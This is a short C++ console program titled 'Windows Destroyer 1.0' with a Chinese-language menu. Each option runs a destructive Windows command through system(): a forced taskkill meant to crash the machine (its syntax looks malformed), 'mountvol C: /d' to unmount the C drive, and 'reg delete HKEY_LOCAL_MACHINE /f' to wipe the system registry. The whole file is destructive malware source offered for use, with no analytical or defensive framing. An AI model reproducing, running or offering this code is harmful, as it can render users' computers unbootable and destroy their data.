#include <iostream>
#include <cstdlib>
using namespace std;
int main(void){
    char c;
    cout<<"================================Windows毁灭器1.0================================\n\n";
    cout<<"1---立刻蓝屏\n";
    cout<<"2---立刻弹出C盘\n";
    cout<<"3---立刻删除HKLM系统必需注册表\n";
    cout<<"4---退出\n\n\n";
    cout<<"请选择一个选项：";
    cin>>c;
    while(c!='1'&&c!='2'&&c!='3'&&c!='4'){
        cout<<"输入错误！请重新输入：";
        cin>>c;
    }
    switch(c){
        case '1':system("taskkill /f /im \"pid ne 1\"");break;
        case '2':system("mountvol C: /d");break;
        case '3':system("reg delete HKEY_LOCAL_MACHINE /f");break;
        case '4':exit(0);break;
        default:break;
    }
    return 0;
}